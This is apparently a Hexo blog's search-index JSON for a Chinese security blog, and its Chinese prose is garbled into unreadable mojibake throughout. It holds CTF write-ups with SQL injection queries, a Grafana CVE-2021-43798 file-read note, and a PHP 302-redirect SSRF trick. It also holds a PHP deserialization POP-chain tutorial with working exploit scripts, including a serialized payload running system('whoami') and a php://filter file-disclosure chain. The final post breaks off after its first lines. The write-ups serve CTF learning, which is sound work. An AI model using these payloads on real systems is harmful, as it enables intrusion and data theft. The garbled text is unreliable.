{"meta":{"title":"å­¤ç‹¬æ˜Ÿçƒ","subtitle":"H3h3QAQã®åšå®¢","description":"æœ¬ç§‘ | è½¯ä»¶å·¥ç¨‹ | ç½‘ç»œå®‰å…¨","author":"H3h3QAQ","url":"http://h3geeker.top","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.525Z","comments":true,"path":"404.html","permalink":"http://h3geeker.top/404.html","excerpt":"","text":""},{"title":"","date":"2021-11-10T11:35:46.649Z","updated":"2021-11-10T11:35:46.649Z","comments":true,"path":"baidu_verify_xxxxxxx.html","permalink":"http://h3geeker.top/baidu_verify_xxxxxxx.html","excerpt":"","text":"wvlc3L96QK"},{"title":"","date":"2021-11-10T11:35:46.652Z","updated":"2021-11-10T11:35:46.652Z","comments":true,"path":"google1xxxxxxx0.html","permalink":"http://h3geeker.top/google1xxxxxxx0.html","excerpt":"","text":"google-site-verification: google110e5e5e14c8dcf0.html"},{"title":"æ”¾æ¾ä¸€ä¸‹","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.541Z","comments":true,"path":"List/index.html","permalink":"http://h3geeker.top/List/index.html","excerpt":"","text":"å½±éŸ³èµ„æºå…±äº«"},{"title":"about","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.648Z","comments":true,"path":"about/index.html","permalink":"http://h3geeker.top/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.649Z","comments":true,"path":"categories/index.html","permalink":"http://h3geeker.top/categories/index.html","excerpt":"","text":""},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.648Z","comments":true,"path":"archives/index.html","permalink":"http://h3geeker.top/archives/index.html","excerpt":"","text":""},{"title":"ç•™è¨€æ¿","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-14T14:28:40.892Z","comments":true,"path":"contact/index.html","permalink":"http://h3geeker.top/contact/index.html","excerpt":"","text":"ç•…æ‰€æ¬²è¨€ åœ¨è¿™é‡Œå¯ä»¥ç•™ä¸‹ä½ çš„è¶³è¿¹ï¼Œæ¬¢è¿åœ¨ä¸‹æ–¹ç•™è¨€ï¼Œæ¬¢è¿äº¤æ¢å‹é“¾ï¼Œä¸€èµ·äº¤æµå­¦ä¹ ï¼ å‹é“¾ H3h3QAQã®å‹é“¾ä¿¡æ¯ åšå®¢åç§°: H3h3QAQã®åšå®¢ åšå®¢ç½‘å€: http://h3geeker.top/ åšå®¢ä»‹ç»: The harder you work, the luckier you will be"},{"title":"ç»Ÿè®¡","date":"2020-10-31T02:11:28.000Z","updated":"2021-11-10T11:35:46.650Z","comments":true,"path":"census/index.html","permalink":"http://h3geeker.top/census/index.html","excerpt":"","text":""},{"title":"å‹é“¾","date":"2019-07-19T08:42:10.000Z","updated":"2021-11-10T11:35:46.651Z","comments":true,"path":"friends/index.html","permalink":"http://h3geeker.top/friends/index.html","excerpt":"","text":""},{"title":"èµ„æºåˆ†äº«","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.652Z","comments":true,"path":"resource/index.html","permalink":"http://h3geeker.top/resource/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-11-10T13:59:42.424Z","updated":"2021-11-10T13:59:42.424Z","comments":true,"path":"tags/index.html","permalink":"http://h3geeker.top/tags/index.html","excerpt":"","text":""},{"title":"å¬å¬éŸ³ä¹","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.542Z","comments":true,"path":"List/music/index.html","permalink":"http://h3geeker.top/List/music/index.html","excerpt":"","text":""},{"title":"ç›¸å†Œ","date":"2021-11-10T11:35:46.532Z","updated":"2021-11-10T11:35:46.532Z","comments":true,"path":"List/galleries/index.html","permalink":"http://h3geeker.top/List/galleries/index.html","excerpt":"","text":""},{"title":"è§†é¢‘","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.542Z","comments":true,"path":"List/movies/index.html","permalink":"http://h3geeker.top/List/movies/index.html","excerpt":"","text":""},{"title":"å¬å¬éŸ³ä¹","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.543Z","comments":true,"path":"List/tools/index.html","permalink":"http://h3geeker.top/List/tools/index.html","excerpt":"","text":""},{"title":"ä¹–å·§å°ç‹—","date":"2021-11-10T11:35:46.533Z","updated":"2021-11-10T11:35:46.533Z","comments":true,"path":"List/galleries/ä¹–å·§å°ç‹—/index.html","permalink":"http://h3geeker.top/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"äºŒæ¬¡å…ƒé£","date":"2021-11-10T11:35:46.534Z","updated":"2021-11-10T11:35:46.534Z","comments":true,"path":"List/galleries/äºŒæ¬¡å…ƒé£/index.html","permalink":"http://h3geeker.top/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"åŠ¨æ¼«äººç‰©","date":"2021-11-10T11:35:46.535Z","updated":"2021-11-10T11:35:46.535Z","comments":true,"path":"List/galleries/åŠ¨æ¼«äººç‰©/index.html","permalink":"http://h3geeker.top/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"åŠ¨æ¼«æ’ç”»","date":"2021-11-10T11:35:46.535Z","updated":"2021-11-10T11:35:46.535Z","comments":true,"path":"List/galleries/åŠ¨æ¼«æ’ç”»/index.html","permalink":"http://h3geeker.top/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"åŠ¨æ¼«é£æ™¯","date":"2021-11-10T11:35:46.536Z","updated":"2021-11-10T11:35:46.536Z","comments":true,"path":"List/galleries/åŠ¨æ¼«é£æ™¯/index.html","permalink":"http://h3geeker.top/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"å‘†èŒçŒ«å’ª","date":"2021-11-10T11:35:46.537Z","updated":"2021-11-10T11:35:46.537Z","comments":true,"path":"List/galleries/å‘†èŒçŒ«å’ª/index.html","permalink":"http://h3geeker.top/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"åŸå¸‚é£å…‰","date":"2021-11-10T11:35:46.538Z","updated":"2021-11-10T11:35:46.538Z","comments":true,"path":"List/galleries/åŸå¸‚é£å…‰/index.html","permalink":"http://h3geeker.top/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"æ¸…æ–°èŠ±å‰","date":"2021-11-10T11:35:46.538Z","updated":"2021-11-10T11:35:46.538Z","comments":true,"path":"List/galleries/æ¸…æ–°èŠ±å‰/index.html","permalink":"http://h3geeker.top/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"ç‚«é…·è·‘è½¦","date":"2021-11-10T11:35:46.539Z","updated":"2021-11-10T11:35:46.539Z","comments":true,"path":"List/galleries/ç‚«é…·è·‘è½¦/index.html","permalink":"http://h3geeker.top/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"ç’€ç’¨æ˜Ÿç©º","date":"2021-11-10T11:35:46.540Z","updated":"2021-11-10T11:35:46.540Z","comments":true,"path":"List/galleries/ç’€ç’¨æ˜Ÿç©º/index.html","permalink":"http://h3geeker.top/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"ç”œç¾é£Ÿå“","date":"2021-11-10T11:35:46.540Z","updated":"2021-11-10T11:35:46.540Z","comments":true,"path":"List/galleries/ç”œç¾é£Ÿå“/index.html","permalink":"http://h3geeker.top/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""},{"title":"è‡ªç„¶é£æ™¯","date":"2021-11-10T11:35:46.541Z","updated":"2021-11-10T11:35:46.541Z","comments":true,"path":"List/galleries/è‡ªç„¶é£æ™¯/index.html","permalink":"http://h3geeker.top/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""}],"posts":[{"title":"ã€XCTFã€‘ç¬¬å››æœŸä¸ªäººèƒ½åŠ›è®¤è¯è€ƒæ ¸ä¸ªäººwp","slug":"*CTF wp","date":"2022-04-16T02:24:13.914Z","updated":"2022-04-18T07:57:46.568Z","comments":true,"path":"posts/925c2943.html","link":"","permalink":"http://h3geeker.top/posts/925c2943.html","excerpt":"","text":"Greyä¿®æ”¹å›¾ç‰‡é•¿åº¦ï¼Œç„¶åç”¨Stegsolveï¼Œåœ¨Alpha3é€šé“å¯ä»¥çœ‹åˆ°ä¸¤æ®µflag ç„¶ååœ¨010æœ«å°¾å¯ä»¥çœ‹åˆ°m3_1F è¿èµ·æ¥ï¼Œflagï¼š*CTF{Catch_m3_1F_y0u_cAn} oh-my-grafanaCVE-2021-43798ï¼ŒGrafanaä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ è¯»å–Grafanaé…ç½®æ–‡ä»¶æ‹¿åˆ°ç”¨æˆ·åï¼Œå¯†ç ï¼Œç™»é™† ç™»é™†åå‘ç°æ³¨å…¥ç‚¹ï¼Œå°è¯•æ³¨å…¥ï¼Œå‘ç°æ¯«æ— è¿‡æ»¤ã€‚ã€‚ã€‚ç›´æ¥ä¸€æŠŠæ¢­ select group_concat(table_name) from information_schema.tables where table_schema = database() select group_concat(column_name) from information_schema.columns where table_schema = database() select flag from fffffflllllllllaaaagggggg flagï¼š*ctf{Upgrade_your_grafAna_now!} babyweb è¿™é‡Œèƒ½å¤Ÿè¯·æ±‚èµ„æºï¼Œå°è¯•è¯·æ±‚æœ¬åœ°èµ„æºå‘ç°æœ‰waf é¢˜ç›®å‘Šè¯‰äº†flagåœ¨/flagä¸­ è®¿é—®æç¤ºéœ€è¦ipä¸º127.0.0.1ï¼Œä¹Ÿå°±æ˜¯å†…ç½‘ip ç¬¬ä¸€ååº”æƒ³çš„æ˜¯ï¼Œå†™ä¸€ä¸ªjsï¼Œè¯»å–flagï¼Œå¹¶ä¸”å¼¹å‡ºæ¥ å°è¯•ä¸è¡Œï¼Œå› ä¸ºè¿˜æ˜¯å‰ç«¯è¯·æ±‚ï¼Œéšå³æƒ³åˆ°äº†302è·³è½¬çš„æ–¹æ³• ä¸»é¡µç»™äº†ä¸‹è½½èµ„æºçš„åœ°æ–¹ï¼Œåœ¨è‡ªå·±çš„vpsä¸Šç”¨phpå†™ä¸€ä¸ª302è·³è½¬ï¼Œå¹¶ä¸”èµ·ä¸€ä¸ªphpæœåŠ¡ï¼ˆphp -S portï¼‰ &lt;?php header(\"location:http://127.0.0.1:8089/flag\") ?&gt; ç„¶åè®©æœåŠ¡ç«¯è¯·æ±‚ä½ çš„è·³è½¬ï¼Œè·³è½¬åˆ°http://127.0.0.1:8089/flagï¼Œè¿™æ—¶å€™å°±æ˜¯å†…ç½‘èµ„æºè¯·æ±‚ï¼ŒæˆåŠŸå®Œæˆä¸€æ¬¡æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€  ç„¶åè®¿é—®ä¸‹è½½åˆ°çš„èµ„æºï¼ŒæˆåŠŸæ‹¿åˆ°flag flagï¼š*ctf{A_Easy_SSRF_YOU_KNOW}","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"å¤§èµ›wp","slug":"å¤§èµ›wp","permalink":"http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"}]},{"title":"POPé“¾åˆæ¢","slug":"POPé“¾æ„é€ åŸºç¡€","date":"2022-03-06T10:24:48.088Z","updated":"2022-03-26T04:38:07.333Z","comments":true,"path":"posts/4458d455.html","link":"","permalink":"http://h3geeker.top/posts/4458d455.html","excerpt":"","text":"POPé“¾åŸºç¡€Authorï¼šH3h3QAQ ä¹‹å‰æˆ‘å†™äº†ä¸€ç¯‡PHPååºåˆ—åŒ–çš„åŸºç¡€æ–‡ç«  æ¥ä¸‹æ¥æˆ‘æ‰“ç®—è®°å½•ä¸€ä¸‹æˆ‘çš„POPé“¾æ„é€ å­¦ä¹ è¿‡ç¨‹ é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€äº›äº†è§£ä¸€äº›åŸºç¡€çŸ¥è¯† ä¸€ã€POPå’ŒPOPé“¾çš„å®šä¹‰1ã€ä»€ä¹ˆæ˜¯POPé¢å‘å±æ€§ç¼–ç¨‹ï¼ˆProperty-Oriented Programingï¼‰å¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾ã€‚ 2ã€POPé“¾åŸç†POPé“¾æ˜¯ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ä¸­çš„ä¸€ç§å¸¸æœ‰æ–¹æ³•ï¼Œå³å¯»æ‰¾ç¨‹åºç¯å¢ƒä¸­å·²ç»å®šä¹‰æˆ–èƒ½å¤ŸåŠ¨æ€åŠ è½½çš„å¯¹è±¡ä¸­çš„å±æ€§æˆ–å‡½æ•°ï¼Œå°†ä¸€äº›èƒ½å¤Ÿè¢«è°ƒç”¨çš„å‡½æ•°ç»„åˆèµ·æ¥ï¼Œè¾¾åˆ°ç›®çš„çš„æ“ä½œã€‚ äºŒã€POPé“¾æ„é€ åˆæ¢åœ¨ç®€å•çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸å¯»æ‰¾åœ¨æºç ä¸­æ‰¾å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•ï¼Œä½†æ˜¯å…³é”®åˆ©ç”¨ç‚¹å¹¶ä¸æ˜¯é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œæ˜¯åœ¨ç±»çš„æ–¹æ³•ä¸­ï¼Œåœ¨æ­¤æ—¶å¦‚æœæœ‰å¤šä¸ªç±»ï¼Œå­˜åœ¨å¯ä»¥RCEçš„å‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•å»å¯»æ‰¾å­˜åœ¨æˆ‘ä»¬å¯æ§çš„å˜é‡çš„POPé“¾æ¥å°†å…¶ä¸²è”èµ·æ¥ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ 1ã€ç®€å•çš„POPé“¾æ„é€ ä¸‰éƒ¨æ›²æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç»™ä¸€ä¸ªç®€å•çš„ç¯å¢ƒï¼Œæ›´æœ‰åˆ©äºç†è§£ &lt;?php show_source(__FILE__); class Lemon { protected $a; function __construct() { $this-&gt;a = new H3(); } function __destruct() { $this-&gt;a-&gt;action(); } } class H3 { function action() { echo \"I want to play basketball!\"; } } class Hack { private $data; function H3() { eval($this-&gt;data); } } unserialize($_GET['eval']); è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„ç¯å¢ƒï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨åˆ°Hackç±»ä¸­çš„actionæ–¹æ³•ä¸­çš„eval()è¾¾æˆRCE æ¥ä¸‹æ¥æˆ‘ä»¬æ¸©ä¹ ä¸€ä¸‹é­”æœ¯æ–¹æ³•ï¼š __destruct()ï¼š//ææ„å‡½æ•°å½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ __wakeup(): //unserialize()æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ __invoke(): //å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹æ³•è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨ __call(): //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __callStatci(): //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __get(): //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® __set(): //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ __isset(): //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset(): //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ __toString(): //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ __construct(): //æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡newçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œä½†åœ¨unserialize()æ—¶ä¸ä¼šè‡ªåŠ¨è°ƒç”¨ __sleep(): //serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep() å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šè¢«ä¼˜å…ˆè°ƒç”¨ ç¯å¢ƒä¸­ç”¨åˆ°äº†__construct()å’Œ__destruct()é­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦ç‰¢è®°ä½æ¯ä¸ªé­”æœ¯æ–¹æ³•åœ¨ä»€ä¹ˆæƒ…å†µä¸‹è¢«è§¦å‘ã€‚ æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹Lemonç±» class Lemon { protected $a; function __construct() { $this-&gt;a = new H3(); } function __destruct() { $this-&gt;a-&gt;action(); } } å½“Lemonç±»è¢«newçš„æ—¶å€™ä¼šè°ƒç”¨__construct()ä»è€ŒnewH3ç±»ï¼Œç„¶åä¼šè§¦å‘__destruct()æ–¹æ³•ï¼ŒæŠŠaçš„æŒ‡ä¼ ç»™action() ä½†æ˜¯H3ç±»ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨çš„çš„åœ°æ–¹ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çœ‹Hackç±» class Hack { private $data; function action() { eval($this-&gt;data); } } è¯¥ç±»ä¸­æœ‰evalå‡½æ•°ï¼Œå¯ä»¥è¢«åˆ©ç”¨ åˆ°æ­¤æˆ‘ä»¬çš„POPé“¾å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œåˆ©ç”¨Lemon ç±»ä¸­çš„é­”æœ¯æ–¹æ³•å»å®ä¾‹åŒ–Hackç±»ï¼Œä»è€Œæ‰§è¡Œeval()ï¼Œå¹¶ä¸”å‚æ•°å¯æ§ expå¦‚ä¸‹ï¼š &lt;?php class Lemon { protected $a; function __construct() { $this-&gt;a = new Hack(); } } class Hack { private $data=\"system('whoami');\"; } $a=new Lemon(); echo urlencode(serialize($a)); ?&gt; payloadï¼š O%3A5%3A%22Lemon%22%3A1%3A%7Bs%3A4%3A%22%00%2A%00a%22%3BO%3A4%3A%22Hack%22%3A1%3A%7Bs%3A10%3A%22%00Hack%00data%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D%7D æ‰§è¡Œç»“æœï¼š è¿™å°±å®Œæˆäº†ä¸€ä¸ªç®€å•çš„POPé“¾æ„é€  2ã€CTFé¢˜ç›®ä¸­çš„POPé“¾æ„é€ ç»å…¸é¢˜ç›®Ezpop &lt;?php class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ $this-&gt;append($this-&gt;var); } } class Show{ public $source; public $str; public function __construct($file='index.php'){ // å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; } public function __toString(){ //å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ return $this-&gt;str-&gt;source; } public function __wakeup(){ //ä½¿ç”¨unserializeæ—¶è§¦å‘ if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } } } class Test{ public $p; public function __construct(){ // å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ $this-&gt;p = array(); } public function __get($key){ //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® $function = $this-&gt;p; return $function(); } } if(isset($_GET['pop'])){ @unserialize($_GET['pop']); } else{ $a=new Show; highlight_file(__FILE__); } ?&gt; ä¸ºäº†ä¾¿äºè§‚çœ‹ï¼Œæˆ‘æŠŠæ¯ä¸ªé­”æœ¯æ–¹æ³•éƒ½åšäº†æ³¨é‡Šåœ¨ä¸Šé¢ æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹ class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ $this-&gt;append($this-&gt;var); } } æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Modifierç±»æ¥åŒ…å«åˆ°flag.php class Show{ public $source; public $str; public function __construct($file='index.php'){ // å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; } public function __toString(){ //å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ return $this-&gt;str-&gt;source; } public function __wakeup(){ //ä½¿ç”¨unserializeæ—¶è§¦å‘ if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } } } ç„¶åå†åˆ©ç”¨Showç±»è¾“å‡ºflag æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ‰¾ä¸€ä¸‹POPé“¾ ä»__wakeup()å¼€å§‹ï¼ˆæˆ–è€…è¯´ä»Showç±»å¼€å§‹ï¼‰ public function __wakeup(){ //ä½¿ç”¨unserializeæ—¶è§¦å‘ if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } } __wakeup()å…ˆå¯¹å­—ç¬¦ä¸²åšæ¯”è¾ƒï¼Œå¦‚æœ$this-&gt;sourceä¸ºShowç±»ï¼Œåˆ™ä¼šè§¦å‘__toString()é­”æœ¯æ–¹æ³• public function __toString(){ //å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ return $this-&gt;str-&gt;source; } __toString()æ–¹æ³•ä¼šè®¿é—®strä¸­çš„sourceï¼Œå¦‚æœstræ˜¯Testç±»åˆ™ä¼šè§¦å‘__get() public function __get($key){ //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® $function = $this-&gt;p; return $function(); } å¯ä»¥çœ‹åˆ°ï¼Œåœ¨__get()é­”æœ¯æ–¹æ³•ä¸­ï¼Œpä½œä¸ºå‡½æ•°æ¥ä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æ¥å®ä¾‹åŒ–Modifierç±»ï¼Œä»è€Œè§¦å‘__invoke()æ–¹æ³• &lt;?php class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ $this-&gt;append($this-&gt;var); } } è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†ä¸€ä¸ªå®Œæ•´çš„POPé“¾ ç„¶åå°±å¯ä»¥ä¼ªåè®®é…åˆincludeæ¥æŠŠflagè¯»å‡ºæ¥ expå¦‚ä¸‹ï¼š &lt;?php class Modifier { protected $var = \"php://filter/convert.base64-encode/resource=flag.php\"; } class Show{ public $source; public $str; public function __construct($file){ $this-&gt;source = $file; } public function __toString(){ return \"H3\"; } } class Test{ public $p; public function __construct(){ $this-&gt;p = new Modifier(); } } $a = new Show(' '); $a-&gt;str= new Test(); $h3 = new Show($a); echo urlencode(serialize($h3)); å°†å…¶base64è§£ç åæˆåŠŸæ‹¿åˆ°flag 3ã€çœŸå®ç¯å¢ƒä¸‹çš„POPé“¾æ„é€ è¿™é‡Œé€‰æ‹©äº†CVE-2019-9081 Laravel5.7 ååºåˆ—åŒ– RCEè¿›è¡Œå¤ç° å¯¹äºåˆå­¦è€…ï¼Œæˆ‘å»ºè®®å¤ç°ä¸€ä¸‹Thinkphpå’ŒLaravelå‡ ä¸ªååºåˆ—åŒ–æ´ åœ¨å¤ç°çš„è¿‡ç¨‹ä¸­è·Ÿç€ä½œè€…çš„æ€è·¯ï¼Œå¯ä»¥å¾ˆå¥½çš„ä½“ä¼šä¸€ä¸‹POPé“¾å­æ„é€ çš„æ–¹æ³•å’ŒæŠ€å·§ å› ä¸ºä¹‹å‰å·²ç»å¤ç°è¿‡ï¼Œå¹¶ä¸”åœ¨çœ‹é›ªå‘è¿‡æ–‡ç« äº†ï¼Œè¿™é‡Œå°±è´´ä¸ªé“¾æ¥QAQ https://bbs.pediy.com/thread-270904.htm ä¸‰ã€æ€»ç»“ç›¸ä¿¡é€šè¿‡äº†æœ¬ç¯‡æ–‡ç« ï¼Œå¯¹äºå¯¹POPé“¾æ„é€ çš„åˆå­¦è€…ï¼Œèƒ½å¤Ÿæä¾›ä¸€ä¸ªç®€å•å¿«é€Ÿçš„å…¥æ‰‹æ–¹æ³• POPé“¾æ„é€ åœ¨çœŸå®ç¯å¢ƒä¸‹ç»å¸¸è¦â€œè·³æ¥è·³å»â€ï¼Œè¿™å°±å¯¹æŒ–æ˜è€…çš„è€å¿ƒå’ŒæŠ€å·§æ˜¯ä¸ªéå¸¸å¤§çš„è€ƒéªŒï¼Œä½†æ˜¯å¦‚æœæˆåŠŸæŒ–æ˜å‡ºä¸€æ¡é“¾å­åï¼Œæ„Ÿè§‰éå¸¸çš„çˆ½ï½ è€Œé¢å¯¹è¿™äº›ï¼Œå°±éœ€è¦å¤§å®¶å¯¹äºé­”æœ¯æ–¹æ³•æŒæ¡ç‰¢å›ºï¼Œå¹¶ä¸”å¯¹äºè¿™ç§æ„é€ æ€æƒ³ä¹Ÿè¦çµæ´»è¿ç”¨ï¼Œä¸èƒ½å¤ªè¿‡æ­»æ¿ï¼Œè€Œä¸”åœ¨æŒ–é“¾å­çš„è¿‡ç¨‹ä¸­ä¹Ÿä¼šæœ‰ä¸€äº›å°æŠ€å·§ï¼Œè¿™äº›å°±éœ€è¦å¤§å®¶è‡ªè¡Œæ”¶é›†äº†ï¼Œæœ¬ç¯‡æ–‡ç« å°±ä¸è¿‡å¤šèµ˜è¿°å’¯ å‚è€ƒé“¾æ¥ï¼š https://v0w.top/2020/03/05/unsearise-POP/#2-2-%E7%94%A8%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B%E8%AF%B4%E6%98%8E%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0POP%E9%93%BE http://h3geeker.top/posts/ae3250a1.html#toc-heading-2 https://bbs.pediy.com/thread-270904.htm https://www.sec-in.com/article/1094","categories":[{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ã€èŒæ–°å‘ã€‘æ¸—é€æµ‹è¯•é¶åœºè€ƒæ ¸","slug":"æ¸—é€è€ƒæ ¸","date":"2022-01-10T02:03:16.000Z","updated":"2022-01-10T02:03:16.000Z","comments":true,"path":"posts/27d77a69.html","link":"","permalink":"http://h3geeker.top/posts/27d77a69.html","excerpt":"","text":"æœ€è¿‘å¹´æœ«äº†ï¼Œå•ä½æœ‰äº†æ¸—é€çš„è€ƒæ ¸ å¯¹äºæˆ‘è¿™ä¸ªå‡ ä¹æ²¡æœ‰ç©è¿‡å†…ç½‘çš„åŒå­¦ç®€ç›´æ˜¯éå¸¸éš¾è¿‡ï¼ 